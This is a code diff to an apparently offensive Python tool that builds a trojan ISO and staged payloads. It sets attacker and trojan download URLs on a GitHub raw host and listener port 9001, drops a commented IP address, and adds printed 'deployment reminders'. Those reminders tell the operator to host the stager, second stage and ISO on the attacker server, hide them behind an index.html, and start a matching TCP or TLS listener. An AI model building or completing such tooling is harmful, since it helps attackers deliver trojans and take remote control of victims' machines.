@@ -55,7 +55,6 @@ LPORT        = "9001"
 # Host from which you download second.TXT, stager.TXT
 ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 # Host from which you download trojan.ISO
-# TROJAN_URL   = "http://151.61.206.201"
 TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 # File name
 SECONDNAME   = "second.txt"
@@ -1188,6 +1187,20 @@ def step8_iso_creation():
     except Exception:
        warn(f"Could not create iso: {ISONAME}.")    
     info(f"ISO created: {iso_path}") 
+
+    print()
+    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
+    print(f"  {GREEN_DARK}  DEPLOYMENT REMINDERS:{RESET}")
+    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
+    print(f"  {GREEN_DARK}  ** Copy {SECONDNAME}, {STAGERNAME} and {ISONAME} on {ATTACKER_URL}{RESET}")
+    print(f"  {GREEN_DARK}     and verify a web server is activated to download them. {RESET}")
+    print(f"  {GREEN_DARK}  ** [optional] Copy an index.html file on {ATTACKER_URL}{RESET}")
+    print(f"  {GREEN_DARK}     to hide all the files uploaded.{RESET}")
+    print(f"  {GREEN_DARK}  ** Activates the correct listener (TCP, TLS etc) depending on the selected second stage {RESET}")
+    print(f"  {GREEN_DARK}     select them in {STUFF_DIR} folder. {RESET}")
+    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
+    print()
+
  
     
 
